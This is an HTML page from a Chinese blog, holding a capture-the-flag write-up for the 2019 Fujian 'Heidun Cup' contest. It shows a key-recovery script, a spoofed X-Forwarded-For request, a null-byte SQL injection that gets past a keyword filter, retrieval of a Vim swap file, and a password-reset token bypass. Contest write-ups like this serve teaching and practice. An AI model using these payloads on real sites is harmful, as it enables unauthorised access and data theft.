@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="酋小木">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="酋小木">
+    
+    <meta name="keywords" content="酋小木,qymua,QYMUA,木木">
+    
+    <meta name="description" content="热爱binary/vloger的空巢男孩酋小木elf">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>2019 福建省网络安全宣传周黑盾杯Writeup · QYMUA&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >QYMUA&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2019 福建省网络安全宣传周黑盾杯Writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>QYMUA's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2019 福建省网络安全宣传周黑盾杯Writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web,Re,crypto">web,Re,crypto</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/16</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大三接棒冲刺,这一战无疑需要取得好的成绩，为后辈树立榜样！不过福建省”黑盾杯”大多都是基础入门题,就算赢了,也不能太得意XD 路还长~任重而道远呐,这里就挑几题自己做过的题目讲下,misc太基础就不多说了,bin也不说了，害，今年依旧是不会写pwn的菜菜</p>
+<p>简单介绍下”黑盾杯”赛制,比赛时长6小时,上半场标准的夺旗赛,但没有一血奖励机制,下半场企业渗透,最后理论知识竞赛结尾(等保问题)</p>
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="guess-the-key"><a href="#guess-the-key" class="headerlink" title="guess the key"></a>guess the key</h3><p>程序提供了加密方式，和一对明文密文</p>
+<p>先逆向加密算法,写出破解key的脚本,再猜测另一份密文可能使用的Key即可</p>
+<p><strong>payload</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">plain_text = open(<span class="string">'msg01'</span>,<span class="string">'r'</span>).read().strip()</span><br><span class="line">cipher_text = open(<span class="string">'msg01.enc'</span>,<span class="string">'r'</span>).read().strip()</span><br><span class="line">cipher2_text = open(<span class="string">'msg02.enc'</span>,<span class="string">'r'</span>).read().strip()</span><br><span class="line"></span><br><span class="line">plain_text = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> plain_text]</span><br><span class="line">cipher_text = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher_text]</span><br><span class="line">cipher2_text = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher2_text]</span><br><span class="line"></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line">plain = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain_text)):</span><br><span class="line">	c = ((cipher_text[i] - (i*i) - plain_text[i]) ^ t) &amp; <span class="number">0xff</span></span><br><span class="line">	key += chr(c)</span><br><span class="line">	t = plain_text[i]</span><br><span class="line">key = key[<span class="number">0</span>:<span class="number">31</span>]</span><br><span class="line"><span class="keyword">print</span> key</span><br><span class="line"></span><br><span class="line">//VeryVeryLongKeyYouWillNeverKnowVery</span><br><span class="line"></span><br><span class="line">key = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher2_text)):</span><br><span class="line">	c = (cipher2_text[i] - (key[i % len(key)] ^ f) - i*i) &amp; <span class="number">0xff</span></span><br><span class="line">	plain += chr(c)</span><br><span class="line">	f = c</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> plain</span><br><span class="line"></span><br><span class="line">//She had been shopping <span class="keyword">with</span> her Mom <span class="keyword">in</span> Wal-Mart. She must have been <span class="number">6</span> years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much <span class="keyword">in</span> a hurry to hit the Earth, it has no time to flow down the spout.flag&#123;<span class="number">101</span>a6ec9f938885df0a44f20458d2eb4&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="i-have-the-flag"><a href="#i-have-the-flag" class="headerlink" title="i have the_flag"></a>i have the_flag</h3><p>页面js一堆没用的函数，只有一个<code>ck</code>函数有用</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ck</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ic</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> a = [<span class="number">118</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>];</span><br><span class="line">    <span class="keyword">if</span> (s.length == a.length) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] - s.charCodeAt(i) != <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ic = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很显然解出这串Ascii值拿去提交就可以成功getflag</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">I have the Flag</span><br><span class="line">Type <span class="keyword">in</span> something <span class="keyword">to</span> <span class="builtin-name">get</span> the flag.</span><br><span class="line"></span><br><span class="line">Tips: Maybe you have the flag.</span><br><span class="line"></span><br><span class="line">Something: </span><br><span class="line">simpleedu123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!</span><br><span class="line"></span><br><span class="line">muWn9NU0H6erBN/w+C7HVg</span><br></pre></td></tr></table></figure>
+<h3 id="a-little-hard"><a href="#a-little-hard" class="headerlink" title="a little hard"></a>a little hard</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span><br><span class="line">	$cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span><br><span class="line">	$cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span><br><span class="line">	$cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	$cip = <span class="string">"0.0.0.0"</span>;</span><br><span class="line"><span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"�������IP���ڷ����б�֮�ڣ�"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>题目直接给了源码，阅读源码可知可通过伪造XFF头令变量<code>$GetsIP</code>值为<code>1.1.1.1</code>，构造请求头即可得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /hard/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">202.0</span><span class="number">.0</span><span class="number">.37</span></span><br><span class="line">x-forwarded-<span class="keyword">for</span>: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<h3 id="click-1"><a href="#click-1" class="headerlink" title="click_1"></a>click_1</h3><p>这题就太简单了</p>
+<p>查看源码系列</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"esc"</span> <span class="attr">style</span>=<span class="string">"position:absolute;"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onfocus</span>=<span class="string">"nokp();"</span> <span class="attr">onclick</span>=<span class="string">"window.location='?key=700c';"</span> <span class="attr">value</span>=<span class="string">"click me!"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">readonly</span> <span class="attr">style</span>=<span class="string">"width:350;"</span> <span class="attr">id</span>=<span class="string">"hint"</span> <span class="attr">value</span>=<span class="string">"do you want to join? catch button, if you can!"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意到<code>?key=700c</code>，于是构造URL访问<a href="http://202.0.0.37/click/?key=700c即可得到flag" target="_blank" rel="noopener">http://202.0.0.37/click/?key=700c即可得到flag</a></p>
+<h3 id="花式过waf"><a href="#花式过waf" class="headerlink" title="花式过waf"></a>花式过waf</h3><p>2018黑盾杯原题，使用工具扫描后发现有<code>www.zip</code>，下载源码开始代码审计</p>
+<p><code>function.php</code>: eregi 可以使用 %00截断正则</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtering</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $check= eregi(<span class="string">'select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile'</span>, $str);</span><br><span class="line">    <span class="keyword">if</span>($check)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法字符!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>content.php</code>: 里面直接拼接给的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./global.php'</span>;</span><br><span class="line">extract($_REQUEST);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from test.content where id=$message_id"</span>;</span><br></pre></td></tr></table></figure>
+<p>构造请求得到flag。</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message_id=<span class="string">"%00"</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,<span class="title">flag</span>,4 <span class="title">from</span> <span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>题目一开始只有一个文本框，要求填入email，随便填一个后有alert提示前往<a href="mailto:`/forget/step2.php?email=youremail@address.com" target="_blank" rel="noopener">`/forget/step2.php?email=youremail@address.com</a>&amp;check=?????`进行下一步</p>
+<p>发现网页源代码中有重要信息：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"admin"</span> <span class="attr">content</span>=<span class="string">"admin@simplexue.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"editor"</span> <span class="attr">content</span>=<span class="string">"Vim"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>并且<code>step2.php</code>中含有一个提交到<code>submit.php</code>的表单，有<code>emailAddress</code>字段和<code>token</code>字段</p>
+<p>看到Vim可以想到Vim编辑器在非正常退出的情况下会留下<code>.swp</code>文件，经过逐个测试发现了<code>submit.php</code>的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forget/.submit.php.swp</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****不可见***', '***不可见***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">	<span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">	$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">	$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">	$r = mysql_fetch_assoc($r);</span><br><span class="line">	$r = $r[<span class="string">'num'</span>];</span><br><span class="line">	<span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>按照代码构造<code>token</code>，得到flag</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /forget/setp2.php?<span class="attribute">emailAddress</span>=admin@simplexue.com&amp;token=0000000000</span><br></pre></td></tr></table></figure>
